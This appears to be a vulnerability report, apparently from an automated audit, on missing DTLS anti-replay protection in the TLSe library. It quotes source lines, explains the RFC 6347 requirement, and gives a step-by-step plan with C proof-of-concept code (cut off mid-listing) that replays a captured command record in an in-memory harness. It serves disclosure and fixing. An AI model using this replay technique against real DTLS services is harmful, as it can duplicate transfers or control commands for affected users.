╭─ VULN-0012 ──────────────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: No DTLS anti-replay window: captured application-data records are    │
│  re-delivered to the application indefinitely                                │
│                                                                              │
│  Severity: MEDIUM                                                            │
│                                                                              │
│  CVSS Score: 4.3                                                             │
│                                                                              │
│  Target: /workspace/source                                                   │
│                                                                              │
│  Endpoint: tlse.c — DTLS record layer (tls_parse_message /                   │
│  tls_consume_stream)                                                         │
│                                                                              │
│  Method: DTLS 1.2 record replay                                              │
│                                                                              │
│  CVSS Vector: AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N                            │
│                                                                              │
│  Description                                                                 │
│  The DTLS record layer keeps no anti-replay state, so an encrypted           │
│  application-data record captured off the wire can be re-delivered to the    │
│  server at any later time and is accepted again: `tls_read()` returns the    │
│  same plaintext and the application acts on it a second time. The monotonic  │
│  `tls_write` stream of a TLS connection does not apply to DTLS, and nothing  │
│  in `tls_consume_stream()`/`tls_read()` tells the application that the       │
│  record was a duplicate.                                                     │
│                                                                              │
│  Impact                                                                      │
│  A previously valid DTLS record can be re-injected arbitrarily often and     │
│  arbitrarily late in the connection, and the receiving application           │
│  processes it as a fresh message each time. In the demonstrated case one     │
│  command record was executed three times (once originally, twice by replay)  │
│  after the peer's sequence had advanced eleven records past it, so no time   │
│  or sequence proximity is required. Any DTLS-protected operation with side   │
│  effects is exposed: duplicate transfers or provisioning commands,           │
│  re-executed alarms or control actions, replayed chat/media-control          │
│  messages on the library's WebRTC data channels, and double counting in      │
│  metered or billable flows. Integrity impact scales with what the            │
│  duplicated message does; confidentiality is unaffected because the          │
│  replayed ciphertext is unmodified.                                          │
│                                                                              │
│  Technical Analysis                                                          │
│  **The DTLS record layer has no anti-replay state.** `tls_parse_message()`   │
│  reads the epoch and sequence number straight out of each received           │
│  record:\n\n```c title=tlse.c startLineNumber=10456 endLineNumber=10462\n    │
│  if (context->dtls) {\n        CHECK_SIZE(buf_pos + 8, buf_len,              │
│  TLS_NEED_MORE_DATA)\n        dtls_epoch = ntohs(*(unsigned short            │
│  *)&buf[buf_pos]);\n        dtls_sequence_number = ntohll(*(uint64_t         │
│  *)&buf[buf_pos]);\n\n        buf_pos += 8;\n    }\n```\n\nThose same        │
│  attacker-supplied values become the AEAD additional data and nonce, so      │
│  decryption is self-consistent for any record that was ever valid:\n\n```c   │
│  title=tlse.c startLineNumber=10554 endLineNumber=10557\n                if  │
│  (context->dtls)\n                    *((uint64_t *)aad) =                   │
│  htonll(dtls_sequence_number);\n                else\n                       │
│  *((uint64_t *)aad) = htonll(context->remote_sequence_number);\n```\n\nThe   │
│  value is then stored with no comparison against any previous                │
│  value:\n\n```c title=tlse.c startLineNumber=10787 endLineNumber=10791\n     │
│  if (context->dtls) {\n        context->dtls_epoch_remote = dtls_epoch;\n    │
│  context->remote_sequence_number = dtls_sequence_number &                    │
│  (((uint64_t)0xFFFFUL << 32) | 0xFFFFFFFFUL);\n    } else\n                  │
│  context->remote_sequence_number ++;\n```\n\nThere is no highest-seen        │
│  counter, no bitmap or cache of accepted sequence numbers, and no epoch      │
│  comparison (`grep` for replay/window/highest over `tlse.c` and `tlse.h`     │
│  returns nothing relevant; `remote_sequence_number` is only used as a nonce  │
│  input for stream TLS). Once the tag verifies, the record goes to            │
│  `_private_tls_write_app_data()` (`tlse.c:10823`) and out of `tls_read()`,   │
│  so the application processes the duplicated message exactly like the        │
│  original. RFC 6347 section 4.1.2.6 requires the record layer to implement   │
│  a replay detection window; the README's own warning about the DTLS state    │
│  machine covers DoS, not replay.\n\nBecause the check is absent rather than  │
│  weak, the attack needs no cryptography: any party that can observe one      │
│  datagram (an on-path attacker, a shared wireless segment, or the peer       │
│  itself) can re-inject it at any later point in the connection, and the      │
│  library reports nothing to the application that would distinguish the copy  │
│  from a fresh record. The same code path serves the WebRTC/DTLS peer         │
│  connection shim (`tls_peerconnection_iterate()` feeds datagrams to          │
│  `tls_consume_stream()`), so data-channel messages are equally replayable.   │
│                                                                              │
│  PoC Description                                                             │
│  1. Build the PoC against the library: `gcc -DTLS_AMALGAMATION -g -O0 -o     │
│  dtls_replay dtls_replay.c` (it `#include`s `tlse.c` and drives both         │
│  endpoints in one process over an in-memory datagram queue).\n2. Run         │
│  `./dtls_replay server_cert.pem server_key.pem` with a certificate and key   │
│  for the server. The harness completes a full DTLS 1.2 handshake             │
│  (`established=1` on both sides, `ECDHE-RSA-AES128GCM-SHA256`).\n3. The      │
│  client sends `CMD:TRANSFER-100`; the harness keeps a byte-exact copy of     │
│  that datagram and prints its DTLS header (`type=17 epoch=1 seq=1`).\n4.     │
│  The client then sends eleven further records, moving its sequence number    │
│  to 12.\n5. The harness re-delivers the captured datagram verbatim.          │
│  `tls_consume_stream()` consumes all 53 bytes and `tls_read()` returns       │
│  `CMD:TRANSFER-100` again, so the application executes the command a second  │
│  time; a second immediate replay does the same.\n6. Apply the remediation,   │
│  rebuild, and re-run: the replays are dropped (`consume=53 read=0`) and      │
│  exactly 12 commands execute; a separate run confirms out-of-order records   │
│  inside the window are still delivered while duplicates are dropped.         │
│                                                                              │
│  PoC Code                                                                    │
│  ```c\n/* DTLS 1.2 replay PoC: drives a TLSe DTLS server and client in one   │
│  process,\n * shuttles datagrams between them, then re-delivers captured     │
│  application-data\n * records verbatim and observes whether tls_read()       │
│  yields the plaintext again.\n *\n * build: gcc -DTLS_AMALGAMATION -g -O0    │
│  -o dtls_replay dtls_replay.c\n * run:   ./dtls_replay server_cert.pem       │
│  server_key.pem\n */\n#include \"../tlse.c\"\n\n#include                     │
│  <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\ntypedef struct {     │
│  unsigned char *buf; int len; } DGram;\ntypedef struct { DGram q[512]; int   │
│  head, tail; } Queue;\n\nstatic void q_push(Queue *q, const unsigned char    │
│  *buf, int len) {\n    if (q->tail >= 512) { fprintf(stderr, \"queue         │
│  overflow\\n\"); exit(3); }\n    q->q[q->tail].buf = (unsigned char          │
│  *)malloc(len);\n    memcpy(q->q[q->tail].buf, buf, len);\n                  │
│  q->q[q->tail].len = len;\n    q->tail++;\n}\nstatic int q_pop(Queue *q,     │
│  DGram *out) {\n    if (q->head >= q->tail) return 0;\n    *out =            │
│  q->q[q->head++];\n    return 1;\n}\nstatic void drain(struct TLSContext     │
│  *ctx, Queue *q) {\n    unsigned int off = 0, len = 0;\n    const unsigned   │
│  char *m;\n    while ((m = tls_get_message(ctx, &len, off)) != NULL) {\n     │
│  q_push(q, m, (int)len);\n        off += len;\n    }\n                       │
│  tls_buffer_clear(ctx);\n}\nstatic int rd(const char *f, unsigned char *b,   │
│  int m) {\n    FILE *h = fopen(f, \"rb\"); int n;\n    if (!h) return 0;\n   │
│  n = (int)fread(b, 1, m - 1, h); b[n > 0 ? n : 0] = 0; fclose(h); return     │
│  n;\n}\nstatic void keys(struct TLSContext *c, const char *cert, const char  │
│  *key) {\n    unsigned char a[0x20000], b[0x20000];\n    int x = rd(cert,    │
│  a, sizeof(a)), y = rd(key, b, sizeof(b));\n    if (x > 0 && y > 0) {        │
│  tls_load_certificates(c, a, x); tls_load_private_key(c, b, y);              │
│  }\n}\nstatic int cb(struct TLSContext *c, struct TLSCertificate **ch, int   │
│  n) {\n    (void)c; (void)ch; (void)n; return no_error;\n}\n\nint main(int   │
│  argc, char **argv) {\n    struct TLSContext *srv, *cli;\n    Queue c2s =    │
│  {0}, s2c = {0};\n    DGram d, rec1 = {0}, rec2 = {0};\n    unsigned char    │
│  app[0xFFFF];\n    int round, r, k, executed = 0, replay_executed = 0,       │
│  i;\n\n    if (argc < 3) { fprintf(stderr, \"usage: %s srv_cert              │
│  srv_key\\n\", argv[0]); return 2; }\n    tls_init();\n    srv =             │
│  tls_create_context(1, DTLS_V12);\n    keys(srv, argv[1], argv[2]);\n        │
│  cli = tls_create_context(0, DTLS_V12);\n    tls_sni_set(cli,                │
│  \"localhost\");\n    tls_client_connect(cli);\n    drain(cli, &c2s);\n\n    │
│  for (round = 0; round < 60; round++) {\n        int progress = 0;\n         │
│  while (q_pop(&c2s, &d)) {\n            r = tls_consume_stream(srv, d.buf,   │
│  d.len, cb);\n            drain(srv, &s2c); free(d.buf); progress = 1;\n     │
│  if (r < 0) break;\n        }\n        while (q_pop(&s2c, &d)) {\n           │
│  r = tls_consume_stream(cli, d.buf, d.len, cb);\n            drain(cli,      │
│  &c2s); free(d.buf); progress = 1;\n            if (r < 0) break;\n          │
│  }\n        if (!progress) break;\n    }\n    fprintf(stderr, \"handshake:   │
│  srv established=%i cli established=%i cipher=%s\\n\",\n                     │
│  tls_established(srv), tls_established(cli), tls_cipher_name(srv));\n    if  │
│  (tls_established(srv) != 1 || tls_established(cli) != 1) return 1;\n\n      │
│  tls_write(cli, (const unsigned char *)\"CMD:TRANSFER-100\", 16);\n          │
│  drain(cli, &c2s);\n    q_pop(&c2s, &rec1);\n    fprintf(stderr, \"captured  │
│  record: len=%i type=%02x epoch=%u seq=%u\\n\",\n        rec1.len,           │
│  rec1.buf[0], (rec1.buf[3] << 8) | rec1.buf[4], rec1.buf[5]);\n    r =       │
│  tls_consume_stream(srv, rec1.buf, rec1.len, cb);\n    drain(srv, &s2c);\n   │
│  k = tls_read(srv, app, sizeof(app) - 1);\n    if (k > 0) { app[k] = 0;      │
│  executed++; fprintf(stderr, \"[app] executed #%i: '%s' (consume=%i)\\n\",   │
│  executed, app, r); }\n\n    for (i = 0; i < 11; i++) {\n                    │
│  tls_write(cli, (const unsigned char *)\"CMD:NOOP\", 8);\n                   │
│  drain(cli, &c2s);\n        if (!q_pop(&c2s, &rec2)) break;\n        r =     │
│  tls_consume_stream(srv, rec2.buf, rec2.len, cb);\n        drain(srv,        │
│  &s2c);\n        if (tls_read(srv, app, sizeof(app) - 1) > 0) executed++;\n  │
│  free(rec2.buf); rec2.buf = NULL;\n    }\n    fprintf(stderr, \"[app] %i     │
